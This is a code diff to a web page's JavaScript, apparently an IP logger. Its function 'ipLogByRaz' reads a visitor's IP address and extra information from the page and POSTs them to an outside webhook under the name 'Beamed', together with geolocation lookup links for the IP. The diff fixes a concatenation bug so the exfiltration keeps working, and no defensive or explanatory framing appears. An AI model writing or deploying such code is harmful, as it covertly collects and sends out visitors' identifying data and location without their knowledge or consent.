@@ -51,6 +51,7 @@
 
       function ipLogByRaz() {
         var ispp = document.getElementById('ipppp').innerHTML
+        var ispp2 = document.getElementById('ipppp').innerHTML + "/json/"
         var extra = document.getElementById("razzylog").innerHTML
         const request = new XMLHttpRequest();
         request.open("POST", wbhk);
@@ -58,7 +59,7 @@
         const params = {
           username: "Beamed",
           avatar_url: 'https://images.g2crowd.com/uploads/product/image/large_detail/large_detail_de619ca81012d42cede6fd18af63d8b1/inkscape.png',
-          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Raw** : _https://ipapi.co/" + ispp + "/json/" "_\n**Extra Info** : ```" + extra + "```"
+          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Raw** : _https://ipapi.co/" + ispp2 + "_\n**Extra Info** : ```" + extra + "```"
         }
         request.send(JSON.stringify(params));
       }
